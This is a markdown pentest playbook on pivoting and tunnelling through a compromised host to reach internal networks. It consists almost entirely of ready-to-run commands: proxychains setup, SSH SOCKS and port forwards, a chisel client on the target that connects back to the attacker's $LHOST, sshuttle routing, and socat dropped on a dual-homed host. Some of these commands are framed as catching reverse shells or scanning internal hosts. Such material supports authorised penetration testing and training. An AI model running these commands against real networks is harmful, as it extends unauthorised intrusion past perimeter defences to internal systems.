# Pivoting and Tunnelling Playbook

Techniques to route traffic through a compromised host to reach internal networks.

## 1. Proxychains Setup

Before tunnelling, configure Proxychains on the attacker machine to route tools through the tunnel.

Edit `/etc/proxychains4.conf`:
```
[ProxyList]
# socks4  127.0.0.1 9050  <-- Comment this out
socks5  127.0.0.1 1080    <-- Add your proxy port
```

Usage: Prefix any command with `proxychains`.
<!-- cmd: linux -->
```bash
proxychains nmap -sT -Pn -p80,445 10.10.10.x
proxychains xfreerdp /v:10.10.10.x /u:admin /p:pass
```

> ⚠️ Proxychains only routes TCP traffic (not ICMP ping, not UDP). Nmap must use `-sT` (Connect scan) and `-Pn` (skip host discovery).

---

## 2. SSH Tunnelling

If you have SSH access to the compromised host.

### Dynamic Port Forwarding (SOCKS Proxy)
Creates a local SOCKS proxy that routes all traffic through the target.
<!-- cmd: linux -->
```bash
# Attacker
ssh -D 1080 user@$TARGET
```
*Configure proxychains to use SOCKS5 127.0.0.1 1080.*

### Local Port Forwarding
Forwards a specific local port to a specific internal IP/Port.
<!-- cmd: linux -->
```bash
# Attacker
# Access internal port 3306 on 10.10.10.5 via the compromised host
ssh -L 3306:10.10.10.5:3306 user@$TARGET
```
*Usage: `mysql -h 127.0.0.1 -P 3306`*

### Remote Port Forwarding
Forwards a port on the compromised host back to the attacker. Useful for receiving reverse shells from deeper within the network.
<!-- cmd: linux -->
```bash
# Attacker (using reverse port forwarding)
ssh -R 4444:127.0.0.1:4444 user@$TARGET
```

---

## 3. Chisel

When SSH is not available or blocked. Chisel is a fast TCP/UDP tunnel over HTTP.

### Reverse SOCKS Proxy (Most Common)
The compromised host connects back to the attacker, opening a SOCKS proxy on the attacker's machine.

<!-- cmd: linux -->
```bash
# Attacker (Server)
# Start the chisel server, listening on port 8000, allowing reverse proxies
chisel server -p 8000 --reverse
```

<!-- cmd: linux -->
```bash
# Target (Client)
# Connect to attacker and open a SOCKS proxy on attacker's port 1080
./chisel client $LHOST:8000 R:socks
```
*Configure proxychains to use SOCKS5 127.0.0.1 1080.*

### Forward Port Forwarding
<!-- cmd: linux -->
```bash
# Target (Server)
./chisel server -p 8000 --socks5
```

<!-- cmd: linux -->
```bash
# Attacker (Client)
chisel client $TARGET:8000 1080:socks
```

---

## 4. sshuttle

Transparent proxy tool (no Proxychains required). Simulates a VPN over SSH. Requires root on the attacker machine, but only normal user on the target.

<!-- cmd: linux -->
```bash
# Route all traffic destined for the 10.10.10.0/24 subnet through the SSH connection
sudo sshuttle -r user@$TARGET 10.10.10.0/24
```
*After running, you can natively ping and nmap the internal network without proxychains.*

---

## 5. Socat Port Forwarding

Used for jumping across isolated segments. Drop `socat` on a dual-homed compromised host.

<!-- cmd: linux -->
```bash
# Target
# Listen on port 8080, forward to internal IP port 80
./socat TCP4-LISTEN:8080,fork TCP4:10.10.10.5:80
```
*Attacker can now curl http://$TARGET:8080 to reach the internal web server.*
